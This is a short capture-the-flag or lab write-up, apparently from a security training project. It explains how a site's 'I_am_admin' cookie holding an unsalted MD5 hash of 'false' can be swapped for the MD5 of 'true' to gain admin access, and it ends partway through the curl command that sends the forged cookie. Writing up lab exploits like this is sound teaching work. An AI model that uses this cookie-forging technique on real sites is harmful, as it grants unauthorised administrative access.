## Breach 09 – Insecure Cookie-Based Authorization via MD5 Hash

**Vulnerability:**  
The site uses a cookie (`I_am_admin`) that stores an MD5 hash of a Boolean value (`true` or `false`) to determine admin access. This is both predictable and reversible using online hash databases.

Using unsalted MD5 for sensitive logic like authentication or authorization is insecure and easily exploited.

**Exploitation:**  
- Intercepted the request and found the following cookie:
  ```
  I_am_admin=68934a3e9455fa72420237eb05902327
  ```
- Looked up the hash on hashes.com, revealing:
  ```
  68934a3e9455fa72420237eb05902327 → false
  ```
- Replaced the cookie with the MD5 hash for `"true"`:
  ```
  b326b5062b2f0e69046810717534cb09
  ```
- Sent the request again with the modified cookie:
  ```bash
  curl --cookie "I_am_admin=b326b5062b2f0e
